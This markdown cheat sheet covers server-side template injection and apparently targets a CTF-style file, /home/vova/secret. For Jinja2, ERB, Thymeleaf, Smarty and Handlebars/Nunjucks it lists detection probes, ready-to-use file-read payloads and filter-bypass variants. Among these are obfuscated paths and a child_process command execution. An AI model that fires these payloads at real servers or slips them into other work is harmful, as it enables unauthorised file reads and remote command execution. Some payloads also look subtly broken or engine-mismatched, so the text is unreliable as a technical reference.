# Server-side template injection

Test Queries: Enter the commands that will cause the error and look at the specific messages to determine the ENGINE.

# Exploitation of SSTI to access /home/vova/secret by languages ​​and template systems

## Python (Jinja2)

```
{{ }}, {% %}, {{7*7}} = 49
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/home/vova/secret').read() }}
```

ByPass:
```
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/'.join(['home', 'vova', 'secret'])).read() }}
{{ ''[''].__class__.__mro__[1].__subclasses__()[40]('/home/vova/secret').read() }}
{{ config.from_pyfile('/home/vova/secret') }}
```

## Ruby (ERB)

```
<%= %>, <%= 7 * 7 %> = 49
<%= File.read('/home/vova/secret') %>
```

ByPass:
```
<%= IO.readlines('/home/vova/secret') %>
<%= ENV["HOME"] %>/vova/secret
<%= Kernel.open('/home/vova/secret').read %>
```

## Java (Thymeleaf)

```
th:text, ${}, ${7*7} = 49
${new java.util.Scanner(new java.io.File("/home/vova/secret")).useDelimiter("\\A").next()}

${T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/home/vova/secret'))}
${new java.util.Scanner(new java.io.File('/home/vova/secret')).useDelimiter("\\A").next()}
${new java.io.BufferedReader(new java.io.FileReader('/home/vova/secret')).lines().toArray()}
```

## PHP (Smarty)

```
{ },{7*7} = 49
{file_get_contents('/home/vova/secret')}
```

ByPass:
```
{readfile('/home/vova/secret')}

{assign var="file" value=fopen('/home/vova/secret', 'r')}
{while !feof($file)}{fgets($file)}{/while}

{getenv("HOME")}/vova/secret
```

## Node.js (Handlebars, Nunjucks)

```
{{ }}, {{7*7}} = 49 //Handlebars
{% %}, {% 7*7 %} = 49 //Nunjucks

{% set fs = require('fs') %}
{{ fs.readFileSync('/home/vova/secret', 'utf-8') }}
```

ByPass:
```
{% set fs = require('fs') %}
{{ fs.readFileSync('/home/vova/secret', 'utf-8') }}

{% set cp = require('child_process') %}
{{ cp.execSync('cat /home/vova/secret') }}

{% set fs = require('fs') %}
{{ fs.readFileSync(String.fromCharCode(47, 104, 111, 109, 101, 47, 118, 111, 118, 97, 47, 115, 101, 99, 114, 101, 116), 'utf-8') }}

```
